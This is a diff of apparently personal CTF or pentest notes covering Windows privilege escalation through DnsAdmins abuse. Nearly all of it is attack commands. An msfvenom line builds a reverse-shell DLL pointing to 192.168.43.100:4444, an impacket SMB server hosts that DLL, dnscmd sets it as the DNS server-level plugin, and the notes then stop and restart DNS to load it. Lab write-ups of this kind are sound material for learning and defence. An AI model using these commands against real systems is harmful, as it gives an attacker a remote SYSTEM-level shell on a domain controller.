@@ -58,9 +58,11 @@ PrivEsc:
 login as ryan, take malicious dll:
 msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f dll > NAME.dll
 
-impacket smb server and take dll as ryan
+impacket smb server and take dll as ryan:
+sudo impacket-smbserver share ./
 
-dnscmd <FQDN of DC> /config /serverlevelplugindll \\UNC_patheg:dnscmd testmachine.test.local /config /serverlevelplugindll \\192.168.43.100\share\privesc.dll
+dnscmd <FQDN of DC> /config /serverlevelplugindll \\UNC_path
+dnscmd testmachine.test.local /config /serverlevelplugindll \\192.168.43.100\share\privesc.dll
 
 run listener and roll over DNS
 sc.exe <FQDN of DC> stop dns
